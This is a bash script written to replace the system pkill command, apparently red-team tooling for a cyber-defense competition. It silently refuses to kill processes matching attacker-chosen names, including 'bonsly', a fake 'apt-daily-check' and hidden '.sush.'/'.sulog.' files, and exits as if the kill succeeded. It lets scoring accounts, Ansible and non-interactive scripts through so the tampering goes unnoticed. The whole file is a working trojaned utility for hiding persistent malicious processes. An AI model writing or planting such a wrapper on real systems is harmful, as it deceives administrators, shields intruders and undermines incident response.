#!/bin/bash
REAL_PKILL="/usr/bin/pkill"

# Pass straight through for gray team scoring accounts
case "$(whoami)" in
    kingneptune|paintythepirate|greyteamadmin) exec $REAL_PKILL "$@" ;;
esac

# Ansible automation bypass — let Ansible run unimpeded
if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
    exec $REAL_PKILL "$@"
fi

# Script/non-interactive bypass — don't break automated pipelines
if [ ! -t 0 ] && [ ! -t 1 ]; then
    exec $REAL_PKILL "$@"
fi

# Block pkill targeting bonsly or our scripts by name pattern
BLOCKED_PATTERNS=("bonsly" "apt-daily-check" "\.sush\." "\.sulog\.")

for arg in "$@"; do
    for pat in "${BLOCKED_PATTERNS[@]}"; do
        if [[ "$arg" =~ $pat ]]; then
            exit 0  # pretend it worked
        fi
    done
done

exec $REAL_PKILL "$@"
